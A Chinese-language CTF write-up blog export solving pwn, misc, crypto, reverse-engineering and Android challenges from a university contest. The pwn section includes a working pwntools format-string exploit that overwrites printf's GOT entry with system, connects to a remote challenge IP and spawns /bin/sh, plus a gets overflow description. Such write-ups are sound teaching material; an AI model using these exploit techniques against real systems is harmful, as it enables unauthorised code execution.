alt="img"></p><p>然后成功getflag</p><h2 id="pwn-4"><a href="#pwn-4" class="headerlink" title="pwn-4"></a>pwn-4</h2><p><em>嘴上说着pwn4，其实文件名是pwn6</em></p><p><img src="/../../images/clip_image002-1572791007549.jpg" alt="img"></p><p>整体流程如下</p><p>先输入一个数字，判断是否等于1926，等于就退出，</p><p>接着用gets获取了v5变量。这个是溢出点。</p><p>所以我们编写exp的思路就是，</p><p>先让v6不等于1926，不然没法跳到如果假的分支。</p><p>然后v5我们溢出。</p><p>所以我们现在就是需要计算v5和v6之间需要多少字节来填充。</p><p>gdb：<img src="/../../images/clip_image004-1572791007549.jpg" alt="img"></p><p>我是输入了16和15来作为v6和v5的值</p><p>从图中我们发现：</p><p><code>0x7ffffffffffe0e0</code>是15</p><p><code>0x7ffffffffffe0e8</code>是0x10 = 16</p><p>所以我们知道v5和v6之间需要8个字节。</p><p>由此我们构造出wp为：</p><p><img src="/../../images/clip_image006-1572791007549.jpg" alt="img"></p><h2 id="Entry-level-pwn"><a href="#Entry-level-pwn" class="headerlink" title="Entry level pwn"></a>Entry level pwn</h2><p>看到给到的文件名（format），我们想到这是一个pwn的字符串序列化的题，</p><p>查看源码，果然，在pwn函数中，</p><p><img src="/../../images/clip_image002-1572791136273.jpg" alt="img"></p><p>我们发现，这果然是经典的字符串解析漏洞题型，</p><p>输入%x测试，</p><p><img src="/../../images/clip_image004-1572791136273.jpg" alt="img"></p><p>A的ascii码正好是41，所以发现offset（偏移）为7.</p><p>接下来我们需要把printf替换成system，然后输入/bin/sh就行了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">printf_got = 0x0804A014<br>system_plt = 0x08048410<br></code></pre></td></tr></table></figure><p>这两个地址有两个寻找方法，均有效，最快捷的为，</p><h3 id="方法1：-（pwntools提供）"><a href="#方法1：-（pwntools提供）" class="headerlink" title="方法1： （pwntools提供）"></a>方法1： （pwntools提供）</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">e = ELF(‘./<span class="hljs-keyword">format</span>’)<br><span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(e.got[‘<span class="hljs-keyword">printf</span>’])<br><span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(e.plt[‘<span class="hljs-keyword">system</span>’])<br></code></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>​    ida上找：</p><p><img src="/../../images/clip_image006-1572791136273.jpg" alt="img"></p><p><img src="/../../images/clip_image008-1572791136273.jpg" alt="img"></p><p>payload = p32(printf_got)+”%”+str(system_plt-4)+”c%7$n”</p><p>这是最初的payload,</p><p>但是我发现，这样是不行，会输出无数个空字符，等了几分组仍没有停止。</p><p>通过查找资料发现，<a href="https://www.cnblogs.com/ichunqiu/p/9329387.html">https://www.cnblogs.com/ichunqiu/p/9329387.html</a> 里面写道它会输出100+mb的字符，这显然是不行的。同时资料里提到，pwntools提供了一种专门针对formatstingr的payload的方法。</p><p>详情参见： <a href="http://docs.pwntools.com/en/stable/fmtstr.html">http://docs.pwntools.com/en/stable/fmtstr.html</a></p><p>payload = fmtstr_payload(offset,{printf_got:system_plt})</p><p>offset此题为7.</p><p>因此最终exp为：<img src="/../../images/clip_image010.jpg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;117.139.247.14&#x27;</span>, <span class="hljs-number">9939</span>)<br>printf_got = <span class="hljs-number">0x0804A014</span><br>system_plt = <span class="hljs-number">0x08048410</span><br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got:system_plt&#125;)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>python运行即可，</p><h2 id="Veryeasypwn"><a href="#Veryeasypwn" class="headerlink" title="Veryeasypwn"></a>Veryeasypwn</h2><p>拖入ida，空格看流程图，详见流程图.png</p><p><img src="/../../images/clip_image002.png" alt="img"></p><p>发现cmp eax,1/2/3/4/0x…..忘了，反正转为整型是233</p><p>所以在choice输入233即可跳转到fun_sys进而执行shell</p><p>输入cat /flag得到getflag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>很简单的反编译的题，里面加密的算法也比较简单，不多叙述。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    <span class="hljs-built_in">str</span> = base64.b64decode(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        i = i - <span class="hljs-number">16</span><br>        x = i ^ <span class="hljs-number">32</span><br>        s += <span class="hljs-built_in">chr</span>(x)<br>    <span class="hljs-keyword">return</span> (s)<br></code></pre></td></tr></table></figure><p>由此得到以上解密代码，执行之，得到flag，用flag{}包裹并提交，ok</p><h2 id="听"><a href="#听" class="headerlink" title="听"></a>听</h2><p>分离gif，没异常<br>查看hex，<br>发现尾部-.. .. -.. .. ..–.- -.. .. -.. .. ..–.- -.. .- -.-.– 好像是莫斯密码<br>找在线工具<a href="https://www.ctftools.com/down/解得：didi">https://www.ctftools.com/down/解得：didi</a> didi da!<br>这里就很坑，怎么提交都不对，试了5次才得到flag为flag{didi_didi_da!}</p><h2 id="国学"><a href="#国学" class="headerlink" title="国学"></a>国学</h2><p>乾—1 兑—2 离—3 震—4 巽—5 坎—6 艮—7 坤—8<br>14633060547366635653365757035262537322715373166755731020575<br>66 6c 6167 7b 67 75 6f 5f 78 75 65 5f 69 73 5f 67 6f 6f 64 21 7d<br>flag{guo_xue_is_good!}</p><h2 id="饿了么"><a href="#饿了么" class="headerlink" title="饿了么"></a>饿了么</h2><p>下载得到个压缩包，以为是伪加密，然而并没有。直接解压得到base.jpg</p><p>一串分析之后只在属性找到了备注：<code>I42FSRCNJVFFQR2NGNKEOTS2LBDVURCEJ5GVEV2HKE6T2PJ5HU6Q====</code></p><p><code>Binwalk-e</code> 后发现图片里隐藏了一个zip和file.txt</p><p>因为密文不只一个=，所以判断为非base64解码。</p><p>是base32解码，三连解密后为：<code>password</code>。推测应该是解压得到的61F4.zip的密码</p><p>利用password解压文件，解压成功得到新的file.txt</p><p>发现flag四个字母在txt中均有出现，那应该是要我们词频分析。进入网站分析，下载结果。得到flag。</p><h2 id="小猪佩奇"><a href="#小猪佩奇" class="headerlink" title="小猪佩奇"></a>小猪佩奇</h2><p>一开始没有做出来，直到第二道hint的出现，看到hint是密码123456，知道这是123456密码的lsb隐藏文件，恰好github上有：<code>https://github.com/livz/cloacked-pixel</code> 大神工具，直接传参即可。</p><p>有大神写好了脚本，我们直接使用就行了，需要预先pip2 install matplotlib</p><p>执行命令<code>python2 .\lsb.py extract .\01.png real.png 123456</code></p><p>成功分离出<code>real.png</code> 是个二维码，扫描二维码得到flag</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Alice-is-loney"><a href="#Alice-is-loney" class="headerlink" title="Alice_is_loney"></a>Alice_is_loney</h2><p>这个一血我当之无愧，哈哈，我可是上课时候都在笔算rsa的男人！</p><p>链接题目给的nc地址。给出以下信息:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">================HELLO-Ctfer================<br> I write some code here<br> \<span class="hljs-comment">#######################################################</span><br> <span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br> m = bytes_to_long(flag)<br> n = <span class="hljs-number">164888441809128804043925323634271956117746447290247557983550180397219601638632167520893244184248651325836885440262466991644967448074324222935200774858221524309942099541654472034185281067340449292547001584952112657559833907602079378034244708596313856132553777564957631968285353555564224702946380512343248672289</span><br> e = <span class="hljs-number">2</span><br> c = <span class="hljs-built_in">pow</span>(m,e,n)<br> <span class="hljs-built_in">print</span> c<br> \<span class="hljs-comment">#output :499707694085937832478791464262001401287172806732772794560051316967321235368715727466292805495910281773610881330183697022117438765554611594403081</span><br></code></pre></td></tr></table></figure><p>从中我们提取到有用信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">n=164888441809128804043925323634271956117746447290247557983550180397219601638632167520893244184248651325836885440262466991644967448074324222935200774858221524309942099541654472034185281067340449292547001584952112657559833907602079378034244708596313856132553777564957631968285353555564224702946380512343248672289<br>e=2<br>c=499707694085937832478791464262001401287172806732772794560051316967321235368715727466292805495910281773610881330183697022117438765554611594403081<br></code></pre></td></tr></table></figure><p>以下是rsa加密原理：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">m^e = c <span class="hljs-built_in">mod</span> <span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>我们这里<code>e=2</code></p><p>所以m为 <code>m =√(c%n)</code></p><p>因此我们的代码为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">164888441809128804043925323634271956117746447290247557983550180397219601638632167520893244184248651325836885440262466991644967448074324222935200774858221524309942099541654472034185281067340449292547001584952112657559833907602079378034244708596313856132553777564957631968285353555564224702946380512343248672289</span><br>e = <span class="hljs-number">2</span><br>c = <span class="hljs-number">499707694085937832478791464262001401287172806732772794560051316967321235368715727466292805495910281773610881330183697022117438765554611594403081</span><br>m = gmpy2.isqrt( c % n )<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(m))<br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">得到m为<span class="hljs-number">0x666c61677b77656c636f6d655f436375745f456173795f6330797074307d</span>L<br>去掉<span class="hljs-number">0</span>x和L之后为<span class="hljs-built_in">hex</span>。<br>nc再次提交即可得到flag。<br></code></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>由题目可得，本题为rsa加密，</p><p>链接nc，</p><p>hhhhhhhhhhhhhhhhhhhhhhhh this is easy hhhhhhhhhhhhhhhhhhhhhhhhhhhh</p><p>N = 0x25a1b1e3108a3d2e3a962f16765e13defc71456c3804a582318de1453L</p><p>e = 5</p><p>c = 0x1c073214016413df344d16894c48103c8b92fca17f2edb3a19f4d23c6</p><p>#######################################################</p><p>通过查找资料发现，n为p与q的乘积，由于n太大，所以我们可以用<a href="http://factordb.com/index.php?query=63409155256164507967196147936982653264415559154678954807355722568787">http://factordb.com/index.php?query=63409155256164507967196147936982653264415559154678954807355722568787</a></p><p>网站查找p和q。</p><p>这里我得到，</p><p>p是2663993</p><p>q是23802298000094034769309134046892260326665858038920881101172459</p><p>我自己用本机跑了好多时间也没跑出来。。。</p><p>至此，我们已知</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">n=p*q<br>p<br>q<br>e<br>c<br></code></pre></td></tr></table></figure><p>根据网上查找到的资料，</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/env python</span><br>\<span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-attr">__author__</span> = &#x27;Jesen&#x27;<br><span class="hljs-built_in">import</span> gmpy2<br><span class="hljs-built_in">import</span> binascii<br><br><span class="hljs-attr">n</span> = gmpy2.mpz(<span class="hljs-number">63409155256164507967196147936982653264415559154678954807355722568787</span>)<br><span class="hljs-attr">p</span> = gmpy2.mpz(<span class="hljs-number">2663993</span>)<br><span class="hljs-attr">q</span> = gmpy2.mpz(<span class="hljs-number">23802298000094034769309134046892260326665858038920881101172459</span>)<br><span class="hljs-attr">e</span> = gmpy2.mpz(<span class="hljs-number">5</span>)<br><span class="hljs-attr">phi_n</span> = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-attr">d</span> = gmpy2.invert(e, phi_n)<br><span class="hljs-attr">c</span> = gmpy2.mpz(<span class="hljs-number">47227268354772263297672801857404286345600006178682788542814788330438</span>)<br><span class="hljs-attr">m</span> = pow(c, d, n)<br><br>print(<span class="hljs-string">&quot;十进制:\n%s&quot;</span>%m)<br><span class="hljs-attr">m_hex</span> = hex(m)[<span class="hljs-number">2</span>:]<br>print(<span class="hljs-string">&quot;十六进制:\n%s&quot;</span>%(m_hex,))<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/clip_image002-1572792464876.jpg" alt="img"></p><p>由此解得</p><p>··十进制:</p><p>38321129010631058343178605582128475888719355970990717</p><p>·十六进制:</p><p>666c61677b363634343036383761373362656236327d</p><p>把hex值，也就是十六进制传入nc中得到flag</p><p><img src="/../../images/clip_image004-1572792464877.jpg" alt="img"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><p>拖入ida64查看反汇编，发现<img src="/../../images/clip_image002-1572792600422.jpg" alt="img"></p><p>此处有一个判断，输入的数字如果是233333即可跳入yes分支，得到flag，太简单。</p><h2 id="Simple2"><a href="#Simple2" class="headerlink" title="Simple2"></a>Simple2</h2><p>下载好程序，发现ida并不能直接查看汇编代码，猜测是加了壳，查询之后发现是加的upx的壳，在windows下没有脱壳成功，用linux脱成功了，直接upx -d 即可。脱壳之后就开始分析代码</p><p>ida中<img src="/../../images/clip_image002-1572792635868.jpg" alt="img"></p><p>上面是一个main函数前半部分，最下面loc_4049C4是循环。1Fh为31</p><p>还是f5查看伪代码吧，<img src="/../../images/clip_image004-1572792635868.jpg" alt="img"></p><p>这里发现v13到v15疑似密文。</p><p>所以还是看下面的代码推测加密方式吧。</p><p>这里我发现v6是用户输入的变量，程序把v6转成字节码，然后减五</p><p>然后就有了下面的exp：</p><p><img src="/../../images/clip_image006-1572792635869.jpg" alt="img"></p><p><img src="/../../images/clip_image008-1572792635869.jpg" alt="img"></p><p>提交发现不太对。后期发现程序是小端序，是倒序的。</p><p>通过gdb调试我们也可以发现：<img src="/../../images/clip_image010-1572792635869.jpg" alt="img"></p><p>在字符串比较时候，传入的参数是与我前面写的exp完全相反。</p><p>所以我们把exp修改一下：</p><p>就成了下面的样子：2333333333</p><p><img src="/../../images/clip_image012.jpg" alt="img"></p><p>运行得到结果，</p><p>634b863c6c1cf8c3eb479281892a6d03</p><p>flag{634b863c6c1cf8c3eb479281892a6d03}</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><p>看到是个apk，手机安装一下，失败（不支持android9）</p><p>那好吧，直接反编译把，这里取巧一下，直接把apk改成zip</p><p>然后解压classes.dex运用github开源工具，dex2jar成功得到jar</p><p>然后利用jd-gui反编译jar得到各种函数源码，有两个重要点。都在com.example.myapplication下面</p><p><img src="/../../images/clip_image002-1572792705583.jpg" alt="img"></p><p>从mainactivity得到密文：</p><p>FVJaF2IrFLAoEbRdRbupFru4FrNzFeFaFbW5RVQrGYQ=</p><p>同时从(Encryption.Encode(paramAnonymousView, paramAnonymousView.length()).equals(“FVJaF2IrFLAoEbRdRbupFru4FrNzFeFaFbW5RVQrGYQ=”)) 这里发现，encode传入两个参数，一个是密文，一个是密文长度。</p><p>我们继续观察encode函数<img src="/../../images/clip_image004-1572792705583.jpg" alt="img"></p><p>根据这个思路，我们写出了如下decode代码（python）</p><p><img src="/../../images/clip_image006-1572792705583.jpg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">between</span>(<span class="hljs-params">a,num,b</span>):</span><br>  <span class="hljs-keyword">if</span> num&gt;=a <span class="hljs-keyword">and</span> num&lt;=b:<br>​    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>):<br>  <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;FVJaF2IrFLAoEbRdRbupFru4FrNzFeFaFbW5RVQrGYQ=&#x27;</span><br>  result = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>​    j = <span class="hljs-built_in">ord</span>(each)<br>​    <span class="hljs-keyword">if</span> between(<span class="hljs-number">97</span>,j,<span class="hljs-number">122</span>):<br>​      i = j<br>​      i = j - offset % <span class="hljs-number">26</span><br>​      j = i<br>​      <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">122</span>:<br>​        i = j - <span class="hljs-number">26</span><br>​      j = i<br>​      <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">97</span>:<br>​        i = j + <span class="hljs-number">26</span><br>​      j = i<br>​      result += <span class="hljs-built_in">chr</span>(i)<br>​    <span class="hljs-keyword">else</span>:<br>​      j = <span class="hljs-built_in">ord</span>(each)<br>​      i = j<br>​      <span class="hljs-keyword">if</span> between(<span class="hljs-number">65</span>,j,<span class="hljs-number">90</span>):<br>​        i = j - offset % <span class="hljs-number">26</span><br>​        j = i<br>​        <span class="hljs-keyword">if</span> j &lt; <span class="hljs-number">65</span>:<br>​          j = i + <span class="hljs-number">26</span><br>​        i = j<br>​        <span class="hljs-keyword">if</span> j &gt; <span class="hljs-number">90</span>:<br>​          j = i - <span class="hljs-number">26</span><br>​        i = j<br>​      result += <span class="hljs-built_in">chr</span>(i)<br>       flag = <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-keyword">try</span>:<br>​    <span class="hljs-built_in">print</span> base64.b64decode(result),<span class="hljs-string">&quot;  &quot;</span>,offset<br>  <span class="hljs-keyword">except</span> :<br>​    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error!&quot;</span>)<br></code></pre></td></tr></table></figure><p>反正基本思路就是把+改成- -改成+</p><p>这里有一个变量需要注意就是offset他是不可预测的，所以我们直接“爆破”</p><p>最终得到：<img src="/../../images/clip_image008-1572792705583.jpg" alt="img"></p><p>成功!</p><h2 id="WF"><a href="#WF" class="headerlink" title="WF"></a>WF</h2><p>发现是exe程序，运行一下，试试，额。。不能运行，装运行库解决。</p><p>这一步很坑，我的虚拟机和本机都不能执行，后来重新装了一下vc运行库才可以。</p><p>知道流程后拖入ida，寻找关键字符串flag</p><p><img src="/../../images/clip_image002-1572792911008.jpg" alt="img"></p><p>发现程序进行了，创建文件，写入，删除的操作，那我们写一个脚本来无限读D:\flag即可</p><p>PS:这里是因为python读的时候，wf.exe没权限删除文件，会返回文件被占用。</p><p>下面是我的代码<img src="/../../images/clip_image004-1572792911009.jpg" alt="img"></p><p>运行，然后同时运行wf.exe即可Getflag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/11/03/hello-world.html"/>
    <url>/2019/11/03/hello-world.html</url>
    
    <content type="html"><![CDATA[<p>从今以后我也是专业的ctfer了，哈哈，第一次比赛打完了，感觉还不错。</p><h2 id="Start"><a href="#Start" class="headerlink" title="-Start"></a>-Start</h2><h3 id="第一次比赛是在大学"><a href="#第一次比赛是在大学" class="headerlink" title="第一次比赛是在大学"></a>第一次比赛是在大学</h3><p>第一印象还不错哈哈</p><hr>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>jesen</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<html>  <head></head>  <body>对不起,目前无法访问你的连接,你可以访问主页    </body></html>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>About Me</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<html>  <style>  .markdown {    word-wrap: break-word;    font-size: 15px;}  </style>  <div class="markdown">                        <p>欢迎申请友情链接，按照以下格式提交评论即可</p><blockquote><p>名称：Jesen's Blog<br>网址：<a href="https://jesen.ddwhm.com/" target="_blank">https://jesen.ddwhm.com/</a><br>描述：I want to be a great ctfer.</p></blockquote><p><br>申请前请先添加本站对友链，如果贵站没有添加本站的友链，那自然本站也不会添加贵站的友链！</p>                    </div>  <ul>    <li><h3><a href="https://www.bugku.com">Bugku</a></h3></li>    <li><h3><a href="https://yml-sec.top/">yemoli</a></h3></li>    <li><h3><a href="https://www.194nb.com/">Aman</a></h3></li>  </ul>  <br>  <br>  <br>  <br></html>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>标签</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>分类</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
